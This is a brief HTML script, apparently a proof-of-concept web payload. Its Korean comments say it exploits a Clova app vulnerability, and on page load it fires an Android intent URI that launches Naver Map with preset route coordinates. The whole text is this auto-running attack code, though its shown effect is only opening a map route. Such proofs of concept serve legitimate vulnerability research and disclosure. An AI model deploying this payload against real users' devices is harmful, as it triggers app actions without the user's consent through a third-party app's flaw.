    <script>
        // 페이지 로드와 동시에 클로바 앱의 취약점을 이용해 인텐트를 쏩니다.
        window.onload = function() {
            // 데이터 주소(nmap://)를 앞에 두고 package를 지정하면, resolveActivity가 해당 앱을 찾아낼 가능성이 큽니다.
            location.href = "intent://route?dlat=37.3595704&dlon=127.105399&dname=NAVER#Intent;scheme=nmap;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.nhn.android.nmap;end";
        };
    </script>
